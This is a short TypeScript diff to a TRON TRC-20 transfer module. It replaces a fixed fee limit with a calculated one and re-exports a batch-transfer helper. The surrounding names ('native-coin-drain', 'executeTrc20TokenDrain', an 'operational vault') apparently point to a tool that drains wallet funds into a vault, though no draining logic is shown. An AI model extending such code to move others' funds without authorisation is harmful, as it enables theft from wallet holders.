@@ -5,6 +5,7 @@ import { resolveTronSensoryFullHost, tronProApiHeaders } from './tron-sensory-ar
 import { parseNativeAmount } from './native-coin-drain.js'
 import { broadcastSignedTrxNativeTransfer } from './tron-native-drain.js'
 import { resolveTronVaultAddress } from './operational-vault.js'
+import { calculateTronFeeLimit } from './tron-settlement-enhancements.js'
 
 export type Trc20TransferRequest = {
   from: string
@@ -50,7 +51,7 @@ export async function buildTrc20TransferTx(
   const unsignedTransaction = (await tronWeb.transactionBuilder.triggerSmartContract(
     contract,
     functionSelector,
-    { feeLimit: 100_000_000, callValue: 0 },
+    { feeLimit: calculateTronFeeLimit(1), callValue: 0 },
     parameter,
     wallet,
   )) as unknown as { transaction?: Record<string, unknown> }
@@ -98,3 +99,4 @@ export async function executeTrc20TokenDrain(params: {
 }
 
 export { parseNativeAmount as parseTrc20Amount }
+export { batchTransferTrc20, type Trc20BatchLeg } from './tron-settlement-enhancements.js'
